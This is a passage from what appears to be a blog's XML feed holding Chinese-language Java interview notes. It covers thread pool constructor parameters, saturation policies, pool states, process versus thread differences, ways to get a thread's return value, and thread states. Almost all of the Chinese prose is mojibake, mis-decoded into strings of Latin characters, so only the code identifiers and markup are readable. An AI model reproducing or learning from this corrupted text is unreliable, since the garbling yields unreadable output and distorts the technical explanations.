ScheduledExecutorServiceï¼šæ”¯æŒFutureå’Œå®šæœŸæ‰§è¡Œä»»åŠ¡   </p><p><img src="/2020/04/06/mt/image-20200406103956689.png"></p><h3><span id="threadpoolexecutorçš„æ„é€ å‡½æ•°">ThreadPoolExecutorçš„æ„é€ å‡½æ•°</span></h3><p>Ã˜ corePoolSizeï¼šæ ¸å¿ƒçº¿ç¨‹æ•°é‡</p><p>Ã˜ maximumPoolSize:çº¿ç¨‹ä¸å¤Ÿç”¨æ—¶èƒ½å¤Ÿåˆ›å»ºçš„æœ€å¤§çº¿ç¨‹æ•°</p><p>Ã˜ workQueueï¼šä»»åŠ¡ç­‰å¾…é˜Ÿåˆ—</p><p>Ã˜ keepAliveTimeï¼šæŠ¢å çš„é¡ºåºä¸ä¸€å®šï¼Œçœ‹è¿æ°”</p><p>Ã˜ threadFactoryï¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼ŒExecutors.defaultThreadFactory()</p><h3><span id="threadpooleecutor">ThreadPoolEecutor</span></h3><p><img src="/2020/04/06/mt/image-20200406104018426.png"></p><h3><span id="handlerçº¿ç¨‹æ± çš„é¥±å’Œç­–ç•¥">Handler:çº¿ç¨‹æ± çš„é¥±å’Œç­–ç•¥</span></h3><p>Ã˜ AbortPolicyï¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™æ˜¯é»˜è®¤ç­–ç•¥</p><p>Ã˜ CallerRunsPolicyï¼šç”¨è°ƒç”¨è€…æ‰€åœ¨çš„çº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡</p><p>Ã˜ DiscardOldestPolicyï¼šä¸¢å¼ƒé˜Ÿåˆ—ä¸­é æœ€å‰çš„ä»»åŠ¡ï¼Œå¹¶æ‰§è¡Œå½“å‰ä»»åŠ¡</p><p>Ã˜ DiscardPolicyï¼šç›´æ¥ä¸¢å¼ƒä»»åŠ¡</p><p>Ã˜ å®ç°RejectedExecutionHandleræ¥å£çš„è‡ªå®šä¹‰handler</p><h3><span id="æ–°ä»»åŠ¡æäº¤executeæ‰§è¡Œåçš„åˆ¤æ–­">æ–°ä»»åŠ¡æäº¤executeæ‰§è¡Œåçš„åˆ¤æ–­</span></h3><p>Ã˜ å¦‚æœè¿è¡Œçš„çº¿ç¨‹å°‘äºcorePoolSizeï¼Œåˆ™åˆ›å»ºæ–°çº¿ç¨‹æ¥å¤„ç†ä»»åŠ¡ï¼Œå³ä½¿çº¿ç¨‹æ± ä¸­çš„å…¶ä»–çº¿ç¨‹æ˜¯ç©ºé—²çš„ï¼›</p><p>Ã˜ å¦‚æœçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°é‡å¤§äºç­‰äºcorePoolSizeä¸”å°äºmaximumPoolSizeï¼Œåˆ™åªæœ‰å½“workQueueæ»¡æ—¶æ‰åˆ›å»ºæ–°çš„çº¿ç¨‹å»å¤„ç†ä»»åŠ¡ï¼›</p><p>Ã˜ å¦‚æœè®¾ç½®çš„corePoolSizeå’ŒmaximumPoolSizeç›¸åŒï¼Œåˆ™åˆ›å»ºçš„çº¿ç¨‹æ± çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œè¿™æ—¶å¦‚æœæœ‰æ–°ä»»åŠ¡æäº¤ï¼Œè‹¥workQueueæœªæ»¡ï¼Œåˆ™å°†è¯·æ±‚æ”¾å…¥workQueueä¸­ï¼Œç­‰å¾…æœ‰ç©ºé—²çš„çº¿ç¨‹å»ä»workQueueä¸­å–ä»»åŠ¡å¹¶å¤„ç†ï¼›</p><p>Ã˜ å¦‚æœè¿è¡Œçš„çº¿ç¨‹æ•°é‡å¤§äºç­‰äºmaximumPoolSizeï¼Œè¿™æ—¶å¦‚æœworkQueueå·²ç»æ»¡äº†ï¼Œåˆ™é€šè¿‡handleræ‰€æŒ‡å®šçš„ç­–ç•¥æ¥å¤„ç†ä»»åŠ¡ï¼›</p><p><img src="/2020/04/06/mt/image-20200406104034547.png"></p><p><img src="/2020/04/06/mt/image-20200406104040637.png"></p><p>Ctlï¼šçŠ¶æ€å€¼å’Œæœ‰æ•ˆçº¿ç¨‹æ•°ã€‚</p><p>é«˜3ä½run state</p><p>å‰©ä¸‹29ä½ä¿å­˜work account</p><h3><span id="çº¿ç¨‹æ± çš„çŠ¶æ€">çº¿ç¨‹æ± çš„çŠ¶æ€</span></h3><p>Ã˜ RUNNING:èƒ½æ¥å—æ–°æäº¤çš„ä»»åŠ¡ï¼Œå¹¶ä¸”ä¹Ÿèƒ½å¤„ç†é˜»å¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡</p><p>Ã˜ SHUTDOWN:ä¸å†æ¥å—æ–°æäº¤çš„ä»»åŠ¡ï¼Œä½†å¯ä»¥å¤„ç†å­˜é‡ä»»åŠ¡</p><p>Ã˜ STOPï¼šä¸å†æ¥å—æ–°æäº¤çš„ä»»åŠ¡ï¼Œä¹Ÿä¸å¤„ç†å­˜é‡ä»»åŠ¡</p><p>Ã˜ TIDYINGï¼šæ‰€æœ‰çš„ä»»åŠ¡éƒ½å·²ç»ˆæ­¢</p><p>Ã˜ TERMINATEDï¼šterminatedï¼ˆï¼‰æ–¹æ³•æ‰§è¡Œå®Œåè¿›å…¥è¯¥çŠ¶æ€</p><p><img src="/2020/04/06/mt/image-20200406104105572.png"></p><h3><span id="å·¥ä½œçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ">å·¥ä½œçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</span></h3><p><img src="/2020/04/06/mt/image-20200406104115334.png"></p><h3><span id="çº¿ç¨‹æ± çš„å¤§å°å¦‚ä½•é€‰å®š">çº¿ç¨‹æ± çš„å¤§å°å¦‚ä½•é€‰å®š</span></h3><p>Ã˜ CPUå¯†é›†å‹ï¼šçº¿ç¨‹æ•°&#x3D;æŒ‰ç…§æ ¸æ•°æˆ–è€…æ ¸æ•°+1è®¾å®š</p><p>Ã˜ I&#x2F;Oå¯†é›†å‹ï¼šçº¿ç¨‹æ•°&#x3D;CPUæ ¸æ•°*(1+å¹³å‡ç­‰å¾…æ—¶é—´&#x2F;å¹³å‡å·¥ä½œæ—¶é—´)</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå¤šçº¿ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaçº¿ç¨‹çŸ¥è¯†è€ƒç‚¹</title>
      <link href="/2020/04/05/java-Thread/"/>
      <url>/2020/04/05/java-Thread/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†Javaçº¿ç¨‹çŸ¥è¯†è€ƒç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</a><ul><li><a href="#%E8%BF%9B%E7%A8%8B%E6%98%AF%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%9A%84%E6%9C%80%E5%B0%8F%E5%8D%95%E4%BD%8D%E7%BA%BF%E7%A8%8B%E6%98%AFcpu%E8%B0%83%E5%BA%A6%E7%9A%84%E6%9C%80%E5%B0%8F%E5%8D%95%E4%BD%8D">è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„æœ€å°å•ä½</a></li><li><a href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB-">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ« -</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li><li><a href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F-">è¿›ç¨‹å’Œçº¿ç¨‹é€šä¿¡æ–¹å¼ -</a></li></ul></li><li><a href="#java%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%85%B3%E7%B3%BB-">Javaè¿›ç¨‹å’Œçº¿ç¨‹çš„å…³ç³» -</a></li><li><a href="#java%E4%B8%ADthread%E7%9A%84start%E5%92%8Crun%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB">Javaä¸­Threadçš„startå’Œrunæ–¹æ³•çš„åŒºåˆ« âˆš</a></li><li><a href="#thread-runnable%E4%BB%A5%E5%8F%8Acallable%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB-">Threadã€Runnableä»¥åŠCallableæœ‰ä»€ä¹ˆåŒºåˆ« -</a></li><li><a href="#%E5%A6%82%E4%BD%95%E7%BB%99run%E6%96%B9%E6%B3%95%E4%BC%A0%E5%8F%82">å¦‚ä½•ç»™run()æ–¹æ³•ä¼ å‚</a><ul><li><a href="#%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%96%B9%E5%BC%8F%E4%B8%BB%E8%A6%81%E6%9C%89%E4%B8%89%E7%A7%8D-">å®ç°çš„æ–¹å¼ä¸»è¦æœ‰ä¸‰ç§ -</a></li><li><a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC">å¦‚ä½•è·å–çº¿ç¨‹çš„è¿”å›å€¼ âˆš</a><ul><li><a href="#%E6%96%B9%E6%B3%951%E4%B8%BB%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E6%B3%95">æ–¹æ³•1ï¼šä¸»çº¿ç¨‹ç­‰å¾…æ³•</a></li><li><a href="#%E6%96%B9%E6%B3%952%E4%BD%BF%E7%94%A8thread%E7%B1%BB%E7%9A%84join%E9%98%BB%E5%A1%9E%E5%BD%93%E5%89%8D%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E5%AD%90%E7%BA%BF%E7%A8%8B%E5%A4%84%E7%90%86%E5%AE%8C%E6%AF%95">æ–¹æ³•2ï¼šä½¿ç”¨Threadç±»çš„join()é˜»å¡å½“å‰çº¿ç¨‹ç­‰å¾…å­çº¿ç¨‹å¤„ç†å®Œæ¯•</a></li><li><a href="#%E6%96%B9%E6%B3%953%E9%80%9A%E8%BF%87callable%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0%E9%80%9A%E8%BF%87futuretask-or-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%8E%B7%E5%8F%96">æ–¹æ³•3ï¼šé€šè¿‡Callableæ¥å£å®ç°ï¼šé€šè¿‡FutureTask Or çº¿ç¨‹æ± è·å–</a></li><li><a href="#threadpool">ThreadPool</a></li></ul></li></ul></li><li><a href="#%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%8A%B6%E6%80%81">çº¿ç¨‹çš„çŠ¶æ€</a></li><li><a href="#sleep%E5%92%8Cwait-">Sleepå’Œwait -</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%B7%AE%E5%88%AB">åŸºæœ¬çš„å·®åˆ«</a></li><li><a href="#%E6%9C%80%E4%B8%BB%E8%A6%81%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB">æœ€ä¸»è¦çš„æœ¬è´¨åŒºåˆ«</a></li></ul></li><li><a href="#notify%E5%92%8Cnotifyall%E7%9A%84%E5%8C%BA%E5%88%AB">Notifyå’ŒnotifyAllçš„åŒºåˆ« âˆš</a><ul><li><a href="#%E4%B8%A4%E4%B8%AA%E6%A6%82%E5%BF%B5">ä¸¤ä¸ªæ¦‚å¿µ</a><ul><li><a href="#%E9%94%81%E6%B1%A0entrylist">é”æ± EntryList</a></li><li><a href="#%E7%AD%89%E5%BE%85%E6%B1%A0waitset">ç­‰å¾…æ± WaitSet</a></li></ul></li></ul></li><li><a href="#yeild%E6%96%B9%E6%B3%95">Yeildæ–¹æ³• âˆš</a></li><li><a href="#%E5%AE%88%E6%8A%A4%E7%BA%BF%E7%A8%8B-">å®ˆæŠ¤çº¿ç¨‹ -</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%B8%AD%E6%96%AD%E7%BA%BF%E7%A8%8B">å¦‚ä½•ä¸­æ–­çº¿ç¨‹ âˆš</a><ul><li><a href="#%E5%B7%B2%E7%BB%8F%E8%A2%AB%E6%8A%9B%E5%BC%83%E7%9A%84%E6%96%B9%E6%B3%95">å·²ç»è¢«æŠ›å¼ƒçš„æ–¹æ³•</a></li><li><a href="#%E7%9B%AE%E5%89%8D%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95">ç›®å‰ä½¿ç”¨çš„æ–¹æ³•</a></li></ul></li><li><a href="#%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E5%9B%BE">çº¿ç¨‹çŠ¶æ€å›¾</a></li></ul><!-- tocstop --><h2><span id="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</span></h2><p><img src="/2020/04/05/java-Thread/clip_image002.jpg"></p><h3><span id="è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½çº¿ç¨‹æ˜¯cpuè°ƒåº¦çš„æœ€å°å•ä½">è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„æœ€å°å•ä½</span></h3><p>Ã˜ æ‰€æœ‰ä¸è¿›ç¨‹ç›¸å…³çš„èµ„æºï¼Œéƒ½è¢«è®°å½•åœ¨PCBä¸­</p><p>Ã˜ è¿›ç¨‹æ˜¯æŠ¢å å¤„ç†å™¨çš„è°ƒåº¦å•ä½ï¼›çº¿ç¨‹å±äºæŸä¸ªè¿›ç¨‹ï¼Œå…±äº«å…¶èµ„æº</p><p>Ã˜ çº¿ç¨‹åªç”±æ ˆã€å¯„å­˜å™¨ï¼Œç¨‹åºè®¡æ•°å™¨å’ŒTCBç»„æˆ</p><p><img src="/2020/04/05/java-Thread/image-20200405094518246.png"></p><h3><span id="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«-">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ« -</span></h3><p><font color="red">æ ¹æœ¬åŒºåˆ«</font>ï¼šè¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œè€Œçº¿ç¨‹CPUè°ƒåº¦çš„æœ€å°å•ä½</p><p><font color="red">å¼€é”€æ–¹é¢</font>ï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„ä»£ç å’Œæ•°æ®ç©ºé—´ï¼ˆç¨‹åºä¸Šä¸‹æ–‡ï¼‰ï¼Œè¿›ç¨‹ä¹‹é—´åˆ‡æ¢å¼€é”€å¤§ï¼›çº¿ç¨‹å¯ä»¥çœ‹åšè½»é‡çº§çš„è¿›ç¨‹ï¼ŒåŒä¸€ç±»çº¿ç¨‹å…±äº«ä»£ç å’Œæ•°æ®ç©ºé—´ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„è¿è¡Œæ ˆã€å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢çš„å¼€é”€å° </p><p><font color="red">æ‰€å¤„ç¯å¢ƒ</font>ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­èƒ½åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼ˆç¨‹åºï¼‰ï¼›è€Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ï¼ˆç¨‹åºï¼‰ä¸­æœ‰å¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼ˆé€šè¿‡CPUè°ƒåº¦ï¼Œåœ¨æ¯ä¸ªæ—¶é—´ç‰‡ä¸­åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼‰ </p><p><font color="red">å†…å­˜åˆ†é…</font>ï¼šç³»ç»Ÿåœ¨è¿è¡Œçš„æ—¶å€™ä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸åŒçš„å†…å­˜ç©ºé—´ï¼›è€Œå¯¹çº¿ç¨‹è€Œè¨€ï¼Œé™¤äº†CPUå¤–ï¼Œç³»ç»Ÿä¸ä¼šä¸ºçº¿ç¨‹åˆ†é…å†…å­˜ï¼ˆçº¿ç¨‹æ‰€ä½¿ç”¨çš„èµ„æºæ¥è‡ªå…¶æ‰€å±è¿›ç¨‹çš„èµ„æºï¼‰ï¼Œçº¿ç¨‹ç»„ä¹‹é—´åªèƒ½å…±äº«èµ„æº</p><h3><span id="æ€»ç»“">æ€»ç»“</span></h3><p>Ã˜ çº¿ç¨‹ä¸èƒ½çœ‹ä½œç‹¬ç«‹åº”ç”¨ï¼Œè€Œè¿›ç¨‹å¯ä»¥çœ‹ä½œç‹¬ç«‹åº”ç”¨</p><p>Ã˜ è¿›ç¨‹æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œç›¸äº’ä¸å½±å“ï¼Œçº¿ç¨‹åªæ˜¯è¿›ç¨‹çš„ä¸åŒæ‰§è¡Œè·¯å¾„</p><p>Ã˜ çº¿ç¨‹æ²¡æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œå¤šè¿›ç¨‹çš„ç¨‹åºæ¯”å¤šçº¿ç¨‹ç¨‹åºå¥å£®</p><p>Ã˜ è¿›ç¨‹åˆ‡æ¢æ¯”çº¿ç¨‹çš„åˆ‡æ¢å¼€é”€å¤§</p><h3><span id="è¿›ç¨‹å’Œçº¿ç¨‹é€šä¿¡æ–¹å¼-">è¿›ç¨‹å’Œçº¿ç¨‹é€šä¿¡æ–¹å¼ -</span></h3><p><strong>è¿›ç¨‹</strong>ï¼š</p><p>ï¼ˆ1ï¼‰ç®¡é“ï¼ˆpipeï¼ŒåŠåŒå·¥ï¼‰ï¼Œæµç®¡é“ï¼ˆs_pipeï¼Œå…¨åŒå·¥ï¼‰ï¼Œæœ‰åç®¡é“ï¼ˆFIFOï¼Œå…¨åŒå·¥ï¼‰<br>ï¼ˆ2ï¼‰ä¿¡å·é‡ï¼ˆsophomore&#x2F;mutexï¼‰<br>ï¼ˆ3ï¼‰ä¿¡å·ï¼ˆsignalï¼‰<br>ï¼ˆ4ï¼‰æ¶ˆæ¯é˜Ÿåˆ—<br>ï¼ˆ5ï¼‰å…±äº«å†…å­˜<br>ï¼ˆ6ï¼‰å¥—æ¥å­—ï¼ˆsocketï¼‰</p><p><strong>çº¿ç¨‹</strong>ï¼š</p><p>ï¼ˆ1ï¼‰volatileå˜é‡<br>ï¼ˆ2ï¼‰ä½¿ç”¨Objectç±»çš„wait() å’Œ notify() æ–¹æ³•<br>ï¼ˆ3ï¼‰ä½¿ç”¨JUCå·¥å…·ç±» CountDownLatchã€CyclicBarrierã€Exchangerã€Semaphore<br>ï¼ˆ4ï¼‰ä½¿ç”¨ ReentrantLock ç»“åˆ Condition<br>ï¼ˆ5ï¼‰LockSupportæ–¹æ³•<br>ï¼ˆ6ï¼‰é˜»å¡é˜Ÿåˆ—</p><h2><span id="javaè¿›ç¨‹å’Œçº¿ç¨‹çš„å…³ç³»-">Javaè¿›ç¨‹å’Œçº¿ç¨‹çš„å…³ç³» -</span></h2><p>Ã˜ Javaå¯¹æ“ä½œç³»ç»Ÿæä¾›çš„åŠŸèƒ½è¿›è¡Œå°è£…ï¼ŒåŒ…æ‹¬è¿›ç¨‹å’Œçº¿ç¨‹</p><p>Ã˜ è¿è¡Œä¸€ä¸ªç¨‹åºä¼šäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œè¿›ç¨‹åŒ…å«è‡³å°‘ä¸€ä¸ªçº¿ç¨‹</p><p>Ã˜ æ¯ä¸ªè¿›ç¨‹å¯¹åº”ä¸€ä¸ª<font color="red">JVMå®ä¾‹</font>ï¼Œå¤šä¸ªçº¿ç¨‹å…±äº«JVMé‡Œçš„å †</p><p>Ã˜ Javaé‡‡ç”¨å•çº¿ç¨‹ç¼–ç¨‹æ¨¡å‹ï¼Œç¨‹åºä¼šè‡ªåŠ¨åˆ›å»ºä¸»çº¿ç¨‹</p><p>Ã˜ ä¸»çº¿ç¨‹å¯ä»¥åˆ›å»ºå­çº¿ç¨‹ï¼ŒåŸåˆ™ä¸Šè¦åäºå­çº¿ç¨‹å®Œæˆæ‰§è¡Œ</p><p><font color="red">JVMæ˜¯å¤šçº¿ç¨‹çš„</font></p><p>JVMå®ä¾‹åœ¨åˆ›å»ºçš„æ—¶å€™åŒæ—¶ä¼šåˆ›å»ºå¾ˆå¤šå…¶ä»–çš„çº¿ç¨‹ï¼Œæ¯”å¦‚GCçš„çº¿ç¨‹ã€‚</p><p>å„ä¸ªJVMå®ä¾‹ä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚</p><h2><span id="javaä¸­threadçš„startå’Œrunæ–¹æ³•çš„åŒºåˆ«">Javaä¸­Threadçš„startå’Œrunæ–¹æ³•çš„åŒºåˆ« âˆš</span></h2><p><img src="/2020/04/05/java-Thread/image-20200405095635582.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405095643937.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405095653496.png"></p><p>è°ƒç”¨çº¿ç¨‹çš„startæ–¹æ³•æ˜¯åˆ›å»ºäº†æ–°çš„çº¿ç¨‹ï¼Œåœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œã€‚<br>è°ƒç”¨çº¿ç¨‹çš„runæ–¹æ³•æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œè¯¥æ–¹æ³•ï¼Œå’Œè°ƒç”¨æ™®é€šæ–¹æ³•ä¸€æ ·</p><h2><span id="thread-runnableä»¥åŠcallableæœ‰ä»€ä¹ˆåŒºåˆ«-">Threadã€Runnableä»¥åŠCallableæœ‰ä»€ä¹ˆåŒºåˆ« -</span></h2><p><img src="/2020/04/05/java-Thread/image-20200405095750934.png"></p><ul><li>ç”±äºjavaä¸èƒ½å¤šç»§æ‰¿å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œå› æ­¤ï¼Œåœ¨åˆ›å»ºçº¿ç¨‹çš„æ—¶å€™å°½é‡å¤šè€ƒè™‘é‡‡ç”¨å®ç°æ¥å£çš„å½¢å¼ï¼›</li><li>å®ç°callableæ¥å£ï¼Œæäº¤ç»™ExecutorServiceè¿”å›çš„æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ç»“æœï¼Œå¦å¤–ï¼Œé€šå¸¸ä¹Ÿå¯ä»¥åˆ©ç”¨FutureTask(Callable  callable)å°†callableè¿›è¡ŒåŒ…è£…ç„¶åFutureTaskæäº¤ç»™ExecutorServiceã€‚</li></ul><p>Â·     callableçš„æ ¸å¿ƒæ˜¯callæ–¹æ³•ï¼Œå…è®¸è¿”å›å€¼ï¼Œrunnableçš„æ ¸å¿ƒæ˜¯runæ–¹æ³•ï¼Œæ²¡æœ‰è¿”å›å€¼</p><p>Â·     callæ–¹æ³•å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œä½†æ˜¯runæ–¹æ³•ä¸è¡Œ</p><p><img src="/2020/04/05/java-Thread/image-20200405095815514.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405095822530.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405095831324.png"></p><p>Ã˜ Threadæ˜¯å®ç°äº†<font color="red">Runnableæ¥å£çš„ç±»</font>ï¼Œä½¿å¾—runæ”¯æŒå¤šçº¿ç¨‹</p><p><strong>Futureå°±æ˜¯å¯¹äºå…·ä½“çš„Runnableæˆ–è€…Callableä»»åŠ¡çš„æ‰§è¡Œç»“æœè¿›è¡Œ</strong>å–æ¶ˆã€æŸ¥è¯¢æ˜¯å¦å®Œæˆã€è·å–ç»“æœã€è®¾ç½®ç»“æœæ“ä½œ</p><p>FutureTaskç±»å®ç°äº†RunnableFutureæ¥å£,<code>æ‰€ä»¥å®ƒæ—¢å¯ä»¥ä½œä¸ºRunnableè¢«çº¿ç¨‹æ‰§è¡Œï¼Œåˆå¯ä»¥ä½œä¸ºFutureå¾—åˆ°Callableçš„è¿”å›å€¼</code></p><p>å¯ä»¥çœ‹å‡ºRunnableFutureç»§æ‰¿äº†Runnableæ¥å£å’ŒFutureæ¥å£ï¼Œè€ŒFutureTaskå®ç°äº†RunnableFutureæ¥å£ã€‚æ‰€ä»¥å®ƒæ—¢å¯ä»¥ä½œä¸ºRunnableè¢«çº¿ç¨‹æ‰§è¡Œï¼Œåˆå¯ä»¥ä½œä¸ºFutureå¾—åˆ°Callableçš„è¿”å›å€¼ã€‚</p><h2><span id="å¦‚ä½•ç»™runæ–¹æ³•ä¼ å‚">å¦‚ä½•ç»™run()æ–¹æ³•ä¼ å‚</span></h2><h3><span id="å®ç°çš„æ–¹å¼ä¸»è¦æœ‰ä¸‰ç§-">å®ç°çš„æ–¹å¼ä¸»è¦æœ‰ä¸‰ç§ -</span></h3><p>Ã˜ æ„é€ å‚æ•°ä¼ å‚</p><p>Ã˜ æˆå‘˜å˜é‡ä¼ å‚</p><p>Ã˜ å›è°ƒå‡½æ•°ä¼ å‚</p><p><img src="/2020/04/05/java-Thread/image-20200405101302498.png"></p><h3><span id="å¦‚ä½•è·å–çº¿ç¨‹çš„è¿”å›å€¼">å¦‚ä½•è·å–çº¿ç¨‹çš„è¿”å›å€¼ âˆš</span></h3><h4><span id="æ–¹æ³•1ä¸»çº¿ç¨‹ç­‰å¾…æ³•">æ–¹æ³•1ï¼šä¸»çº¿ç¨‹ç­‰å¾…æ³•</span></h4><p><img src="/2020/04/05/java-Thread/image-20200405101320713.png"></p><p>ç¼ºç‚¹æ˜¯æ§åˆ¶æ—¶é—´ä¸å¤Ÿç²¾å‡†ï¼Œè€Œä¸”é€»è¾‘ä¸€å¤šå®ç°èµ·æ¥å¾ˆéº»çƒ¦</p><h4><span id="æ–¹æ³•2ä½¿ç”¨threadç±»çš„joiné˜»å¡å½“å‰çº¿ç¨‹ç­‰å¾…å­çº¿ç¨‹å¤„ç†å®Œæ¯•">æ–¹æ³•2ï¼šä½¿ç”¨Threadç±»çš„join()é˜»å¡å½“å‰çº¿ç¨‹ç­‰å¾…å­çº¿ç¨‹å¤„ç†å®Œæ¯•</span></h4><p><img src="/2020/04/05/java-Thread/image-20200405101511632.png"></p><p>ç¼ºç‚¹æ˜¯ç²’åº¦ä¸å¤Ÿç»†ï¼Œæ¯”å¦‚è¯´æ— æ³•åšåˆ°çº¿ç¨‹1è¾¾åˆ°æŸä¸ªæ—¶åˆ»å»æ‰§è¡Œçº¿ç¨‹2çš„æ–¹æ³•</p><h4><span id="æ–¹æ³•3é€šè¿‡callableæ¥å£å®ç°é€šè¿‡futuretask-or-çº¿ç¨‹æ± è·å–">æ–¹æ³•3ï¼šé€šè¿‡Callableæ¥å£å®ç°ï¼šé€šè¿‡FutureTask Or çº¿ç¨‹æ± è·å–</span></h4><p><img src="/2020/04/05/java-Thread/image-20200405101544024.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405101550999.png"></p><h4><span id="threadpool">ThreadPool</span></h4><p><img src="/2020/04/05/java-Thread/image-20200405101621964.png"></p><p>æäº¤å¤šä¸ªå®ç°callableçš„ç±»ï¼Œè®©çº¿ç¨‹æ± å¹¶å‘çš„å¤„ç†ç»“æœã€‚ç»Ÿä¸€ç®¡ç†</p><h2><span id="çº¿ç¨‹çš„çŠ¶æ€">çº¿ç¨‹çš„çŠ¶æ€</span></h2><p><img src="/2020/04/05/java-Thread/image-20200405101708723.png"></p><p>Ã˜ æ–°å»ºï¼ˆNewï¼‰ï¼šåˆ›å»ºåå°šæœªå¯åŠ¨çš„çº¿ç¨‹çš„çŠ¶æ€</p><p>Ã˜ è¿è¡Œï¼ˆRunnableï¼‰ï¼šåŒ…å«Runningå’ŒReady</p><p>Ã˜ æ— é™æœŸç­‰å¾…ï¼ˆwaitingï¼‰ï¼šä¸ä¼šè¢«åˆ†é…CPUæ‰§è¡Œæ—¶é—´ï¼Œéœ€è¦æ˜¾å¼è¢«å”¤é†’</p><table><thead><tr><th><strong>è¿›å…¥æ–¹æ³•</strong></th><th><strong>é€€å‡ºæ–¹æ³•</strong></th></tr></thead><tbody><tr><td>æ²¡æœ‰è®¾ç½®Timeoutå‚æ•°çš„Object.wait()æ–¹æ³•</td><td>Object.notify() &#x2F;  Object.notfifyAll()</td></tr><tr><td>æ²¡æœ‰è®¾ç½®Timeoutå‚æ•°çš„Thread.join()æ–¹æ³•</td><td>è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯•</td></tr><tr><td>LockSupport.park()æ–¹æ³•</td><td>LockSupport.unpark</td></tr></tbody></table><p>Ã˜ é™æœŸç­‰å¾…ï¼ˆTimed 